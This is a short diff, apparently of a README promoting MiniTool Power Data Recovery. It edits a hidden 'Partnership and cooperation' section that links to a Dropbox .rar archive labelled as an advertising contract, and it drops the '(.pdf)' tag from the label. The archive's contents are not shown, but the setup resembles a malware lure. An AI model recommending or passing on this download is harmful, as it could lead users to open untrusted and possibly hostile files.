@@ -51,6 +51,6 @@ The latest version of MiniTool Power Data Recovery adds Desktop Recovery, Recycl
 <div align="right"><details>
 <summary>✅ Partnership and cooperation:</summary>
   
- #### <div dir="rtl">:Contract for advertising services (.pdf) </div>
+ #### <div dir="rtl">:Contract for advertising services </div>
  [💾 Download](https://www.dropbox.com/s/nk819tqai55qpv2/Service%20Contract%20MiniTool.rar?dl=1)
 </details></div>
